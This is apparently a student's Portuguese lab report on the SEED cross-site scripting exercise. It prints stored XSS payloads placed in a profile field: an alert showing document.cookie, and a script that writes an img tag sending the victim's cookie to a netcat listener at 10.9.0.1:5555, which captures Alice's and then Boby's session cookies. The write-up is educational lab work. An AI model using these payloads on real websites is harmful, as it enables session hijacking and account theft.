# Trabalho realizado na Semana #10

## Tarefa 1
Efetuou-se o *log in* na plataforma http://www.seed-server.com sob o perfil de Alice forncido. Para efetuar o XSS, alterou-se a secção *Brief Description* para o código indicado. 

![/imgs10/brief.png](/imgs10/brief.png)

Imediamente após o guardar das alterações, como esperado, obteve-se o *pop-up*:

![/imgs10/popup.png](/imgs10/popup.png)

Experimentou-se também com o exemplo usando um *form* e apesar de apenas se usar um *link* exemplificativo, pode comprovar-se que efetivamente funcionaria: 

![/imgs10/withForm.png](/imgs10/withForm.png)

## Tarefa 2

Alterou-se novamente a secção *Brief Description* desta vez para:
``` js
<script>alert(document.cookie);</script>
```

Como resultado, surgiu o *pop up* com as *cookies* do utilizador mal as alterações foram guardadas.

![/imgs10/cookies.png](/imgs10/cookies.png)

## Tarefa 3

Inicialmente, na *shell*, correu-se o seguinte comando por forma a iniciar o servidor TCP:
``` shell
nc -lknv 5555
```

Seguidamente mudou-se *Brief Description* para efetuar o ataque:

``` js
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >'); </script>
```

Após guardar as alterações no perfil, verificou-se a chegada das *cookies* do utilizador autenticado, neste caso, da Alice ao terminal onde se tinha iniciado o servidor.

![/imgs10/cookiesAlice.png](/imgs10/cookiesAlice.png)

Por forma a melhor testar a solução encontrada, efetuou-se a autenticação de Boby e acedeu-se ao perfil de Alice.

Sem surpresa, chegou ao terminal as cookies de Boby.

![/imgs10/cookiesBoby.png](/imgs10/cookiesBoby.png)